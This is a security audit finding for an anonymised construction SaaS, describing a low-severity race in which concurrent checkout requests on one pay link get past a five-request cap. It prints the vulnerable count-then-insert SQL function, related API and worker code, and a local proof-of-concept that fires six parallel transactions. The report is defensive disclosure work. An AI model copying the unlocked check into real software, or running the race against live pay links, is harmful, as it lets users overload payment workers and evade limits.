# Source-code-based

Project: Anonymous construction SaaS (APP-01)
Category: Application/API
Severity: Low
Engagement: Private engagement
Chain: Not applicable
Tech stack: TypeScript/Node.js, Fastify/Zod, PostgreSQL/SQL/RLS, React/Vite, background workers, Docker/Caddy; provider adapters as applicable below
Evidence: Source inspection and recorded local tests of the original behavior; case-specific execution and impact limits are stated below.
Remediation: Resolved, reviewed code as of 03 November 2026; deployment unverified
Contribution: Team security engagement; no claim of sole discovery.
Affected revision: v1.0.0-rc.1 / 1d5d98db9acf

Name-redacted material. Original relative filenames and code remain searchable and can identify the project. Bracketed substitutions visibly mark redactions inside excerpts.

# Concurrent checkout requests bypass the five-request cap

## Description

Concurrent requests can exceed the five-checkout cap for one pay link and create extra worker work.

Prerequisite and affected workflow: A valid pay-link holder submits checkout requests concurrently before the count-and-insert operations serialize.

Established observation: Concurrent requests using one valid payment link passed the five-checkout limit and created extra checkout records. The test exercised the database admission race without charging a payment method.

Limits: The proof made no payment-provider call. The original assessment used a pre-production source release. Local fixtures and captured provider handoffs do not establish public reachability, actual external delivery, real charges or production build equivalence. Private lab evidence, where specifically recorded above, applies only to that narrow mechanism.

### Mechanism step by step

#### Step 1 — Reach the affected workflow

A valid pay-link holder submits checkout requests concurrently before the count-and-insert operations serialize.

Source: `packages/db/migrations/0106_automation_leaves_the_api.sql:485-510` (1d5d98db9acf).

```sql
-- A request on a live pay link (0023's pay_token_tenant says whose). At most five unanswered ones per
-- link: a page pressing the button over and over is told to wait.
create function app.request_checkout(p_token text, p_kind text, p_return_url text, p_provider_session_id text) returns uuid
language plpgsql security definer set search_path = app, pg_temp as $$
declare
  h bytea := sha256(convert_to(coalesce(p_token, ''), 'UTF8'));
  company uuid := app.pay_token_tenant(sha256(convert_to(coalesce(p_token, ''), 'UTF8')));
  request_id uuid;
begin
  if company is null then
    raise exception 'This payment link isn''t valid any more. Ask us for a new one and we''ll send it over.' using errcode = '22023';
  end if;
  if p_kind not in ('checkout', 'confirm') then
    raise exception 'A pay page asks for a checkout or a confirmation' using errcode = '22023';
  end if;
  if (select count(*) from app.checkout_requests r where r.token_hash = h and r.status in ('pending', 'working')) >= 5 then
    raise exception 'Please wait a moment and try again.' using errcode = '54000';
  end if;
  insert into app.checkout_requests (tenant_id, token_hash, kind, return_url, provider_session_id)
  values (company, h, p_kind, p_return_url, p_provider_session_id)
  returning id into request_id;
  perform pg_notify('aos_checkout_requests', '');
  return request_id;
end $$;
revoke all on function app.request_checkout(text, text, text, text) from public;
grant execute on function app.request_checkout(text, text, text, text) to app_auth;
```

#### Step 2 — Cross the missing state or authority check

`app.request_checkout` performs a separate count and insert without a token-scoped lock or enforcing constraint: `packages/db/migrations/0106_automation_leaves_the_api.sql:485-510`. The public route reaches that function and the worker drains every queued row: `apps/api/src/features/invoices/routes.ts:323-373`; `apps/worker/src/jobs/checkout-requests.ts:92-120,142-162`.

Source: `apps/api/src/features/invoices/routes.ts:323-373` (1d5d98db9acf).

```typescript
  publicRoutes: {
    prefix: '/api/public/pay',

    // Every route here keeps the platform's allowance for /api/public/* (5 requests a minute per IP
    // address, core/config.ts): a pay link is 32 random bytes, so there is nothing to guess, and one
    // customer paying one invoice needs a handful of requests, not dozens. The one exception is
    // Stripe's webhook, which has the webhooks' own allowance, like the Twilio webhooks.
    register(app: ApiApp) {
      const webBaseUrl = webAppBaseUrl(process.env);

      // Stripe's webhook needs the body exactly as sent (the signature covers its bytes), so it lives in
      // its own plugin whose JSON parser keeps the text; the other pay routes keep Fastify's JSON parser.
      // Stripe cannot send the X-[redacted name] header, so this is (with the Twilio webhooks) the one place
      // the CSRF header check is off, honoured under /api/public/ only. The API cannot check the
      // signature (the company's secret is its Automation member's alone, migration 0100): it stores the
      // request as it came, and the worker checks it and acts (apps/worker/src/jobs/webhook-inbox.ts). So
      // every answer is the same 200: the address never says which companies exist or take cards.
      void app.register(async (scope) => {
        const hook = scope as ApiApp;
        hook.addContentTypeParser('application/json', { parseAs: 'string', bodyLimit: STRIPE_BODY_LIMIT }, (_request, body, done) => done(null, String(body)));
        hook.post('/stripe/:company', { config: { csrf: false, rateLimit: WEBHOOK_RATE_LIMIT }, schema: { params: z.object({ company: companySlug }) } }, async (request, reply) => {
          const signature = request.headers['stripe-signature'];
          await app.db.withAuth(({ client }) =>
            client.query('select app.receive_webhook($1, $2, $3, $4)', [
              'stripe',
              request.url,
              typeof signature === 'string' ? signature.slice(0, 2000) : null,
              typeof request.body === 'string' ? request.body : '',
            ]),
          );
          return reply.status(200).send({ received: true });
        });
      });

      // The local test checkout exists only where dev tools are on, never in production: elsewhere these
      // two addresses are not registered at all, so they are plain 404s.
      if (testCheckoutAvailable(app.config)) registerTestCheckout(app);

      // Nothing here proves anyone (0106): the pay link is looked up, and what needs the company's own
      // Stripe key is asked of the worker, which answers within a second or two.
      app.get('/:token', { schema: { params: z.object({ token: payToken }) } }, async (request) => {
        const summary = await paySummary(app.db, request.params.token);
        const onlinePayments = await onlinePaymentsFor(app, request.params.token);
        return { ...summary, isTestPayments: onlinePayments === 'test', onlinePayments };
      });

      app.post('/:token/checkout', { schema: { params: z.object({ token: payToken }) } }, async (request) => {
        const token = request.params.token;
        const checkout = await startCheckout(app, { token, returnUrl: payLinkUrl(webBaseUrl, token) });
        return { checkoutUrl: checkout.checkoutUrl, isTest: checkout.isTest };
      });
```

Source: `apps/worker/src/jobs/checkout-requests.ts:92-120` (1d5d98db9acf).

```typescript
/** One request, in its company's Automation transaction: the answer goes on the row with it. */
async function fulfil(options: CheckoutJobOptions, row: RequestRow): Promise<'done' | 'failed'> {
  let provider: PaymentProvider | null = null;
  try {
    await withAutomation(options.pool, row.tenant_id, async (client) => {
      const { rows } = await client.query<{ user_id: string }>('select app.current_user_id() as user_id');
      const ctx: DbContext = {
        client,
        tenantId: row.tenant_id,
        userId: rows[0]!.user_id,
        actor: 'automation',
        devTools: options.config.devTools,
        emit: () => {
          throw new Error('A checkout records no events');
        },
      };
      provider = await paymentProviderOf(options, client, row.tenant_id, row.token_hash);
      if (!provider) throw new HttpError(422, 'invalid', ONLINE_PAYMENTS_NOT_SET_UP);
      const answer: CheckoutOpened | CheckoutResult | null =
        row.kind === 'checkout'
          ? await openCheckoutIn(ctx, options.logger, provider, row.token_hash, row.return_url!)
          : await confirmCheckoutIn(ctx, options.logger, provider, row.token_hash, row.provider_session_id!);
      if (!answer) {
        // Nothing is due any more: the earlier checkout was paid at that very moment and has just been
        // recorded, in this transaction, so the refusal is written here and commits with the payment.
        await client.query(`update app.checkout_requests set status = 'failed', error_code = 'invalid', error = $2, answered_at = now() where id = $1`, [row.id, NOTHING_DUE]);
        return;
      }
      await client.query(`update app.checkout_requests set status = 'done', answer = $2::jsonb, answered_at = now() where id = $1`, [row.id, JSON.stringify(answer)]);
```


#### Step 3 — Observe the durable effect

Concurrent requests using one valid payment link passed the five-checkout limit and created extra checkout records. The test exercised the database admission race without charging a payment method.

The proof made no payment-provider call.

Test assertion for this transition (test code, not application implementation):

Source: `security-audit/pocs/run-leads-003-010.mjs:407-430` (test source).

```javascript
async function poc006CheckoutCapRace(pg, setup) {
  const tenant = setup.tenantId;
  pg.psql(`
    create or replace function app.pay_token_tenant(p_token_hash bytea) returns uuid
    language sql stable security definer set search_path = app, pg_temp as $$
      select ${sqlLiteral(tenant)}::uuid
    $$;
    truncate app.checkout_requests;
  `);
  const transaction = `
    begin;
    select app.request_checkout('POC-PAY-TOKEN', 'checkout', '[redacted URL]', null);
    select pg_sleep(3);
    commit;
  `;
  const results = await Promise.all(Array.from({ length: 6 }, () => pg.psqlAsync(transaction)));
  assert.deepEqual(results.map((result) => result.status), [0, 0, 0, 0, 0, 0]);
  const racedCount = Number(pg.psql(`select count(*) from app.checkout_requests where status in ('pending', 'working');`).stdout);
  assert.equal(racedCount, 6);

  pg.psql('truncate app.checkout_requests;');
  for (let index = 0; index < 5; index++) {
    pg.psql(`select app.request_checkout('POC-PAY-TOKEN', 'checkout', '[redacted URL]', null);`);
  }
```

## Proof of concept

The excerpts below come from the original local proof. They show the asserted transition and controls within the stated scope.

Setup: A valid pay-link holder submits checkout requests concurrently before the count-and-insert operations serialize.

Recorded result: Concurrent requests using one valid payment link passed the five-checkout limit and created extra checkout records. The test exercised the database admission race without charging a payment method.

Scope: The proof made no payment-provider call. The original assessment used a pre-production source release. Local fixtures and captured provider handoffs do not establish public reachability, actual external delivery, real charges or production build equivalence. Private lab evidence, where specifically recorded above, applies only to that narrow mechanism.

Proof availability: Excerpts and source references; original harness not distributed.

## Relevant test excerpts

Source: `security-audit/pocs/run-leads-003-010.mjs:407-430` (test source).

```javascript
async function poc006CheckoutCapRace(pg, setup) {
  const tenant = setup.tenantId;
  pg.psql(`
    create or replace function app.pay_token_tenant(p_token_hash bytea) returns uuid
    language sql stable security definer set search_path = app, pg_temp as $$
      select ${sqlLiteral(tenant)}::uuid
    $$;
    truncate app.checkout_requests;
  `);
  const transaction = `
    begin;
    select app.request_checkout('POC-PAY-TOKEN', 'checkout', '[redacted URL]', null);
    select pg_sleep(3);
    commit;
  `;
  const results = await Promise.all(Array.from({ length: 6 }, () => pg.psqlAsync(transaction)));
  assert.deepEqual(results.map((result) => result.status), [0, 0, 0, 0, 0, 0]);
  const racedCount = Number(pg.psql(`select count(*) from app.checkout_requests where status in ('pending', 'working');`).stdout);
  assert.equal(racedCount, 6);

  pg.psql('truncate app.checkout_requests;');
  for (let index = 0; index < 5; index++) {
    pg.psql(`select app.request_checkout('POC-PAY-TOKEN', 'checkout', '[redacted URL]', null);`);
  }
```

Source: `security-audit/pocs/run-leads-003-010.mjs:423-437` (test source).

```javascript
  assert.deepEqual(results.map((result) => result.status), [0, 0, 0, 0, 0, 0]);
  const racedCount = Number(pg.psql(`select count(*) from app.checkout_requests where status in ('pending', 'working');`).stdout);
  assert.equal(racedCount, 6);

  pg.psql('truncate app.checkout_requests;');
  for (let index = 0; index < 5; index++) {
    pg.psql(`select app.request_checkout('POC-PAY-TOKEN', 'checkout', '[redacted URL]', null);`);
  }
  const sixthSequential = pg.psql(`select app.request_checkout('POC-PAY-TOKEN', 'checkout', '[redacted URL]', null);`, { allowFailure: true });
  assert.notEqual(sixthSequential.status, 0);
  assert.match(sixthSequential.stderr, /Please wait a moment/);
  return {
    verdict: 'race-proved',
    concurrentRequestsCommitted: racedCount,
    sequentialSixthRejected: true,
```

## Remediation

Lock per pay token and enforce the count and insert atomically, with a database cap or replaceable active request.
